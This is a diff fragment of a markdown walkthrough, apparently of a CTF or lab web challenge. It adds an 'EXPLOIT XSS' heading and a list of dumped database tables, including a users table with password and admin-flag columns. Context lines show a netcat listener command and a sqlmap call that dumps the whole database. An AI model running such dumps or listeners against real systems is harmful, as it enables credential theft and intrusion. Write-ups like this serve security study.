@@ -78,6 +78,8 @@ Reconnaissance:
 --> Bingo! The pop up message appear. We found the security vulnerability XSS
 (Cross-Site Scripting).
 
+EXPLOIT XSS:
+
 + Back to the home page we see the page list which we created. Go inside the page /item, we have 2 features: 
 
 ![alt text](image-3.png)
@@ -150,8 +152,10 @@ nc -lvkp <port>
 
 ![alt text](image-11.png)
 
+items,messages,users
+table users: id, isAdministrator,password,username
 
-
+![alt text](image-12.png)
 
 ```bash
 sqlmap -r request.txt --dbms=mysql --dump
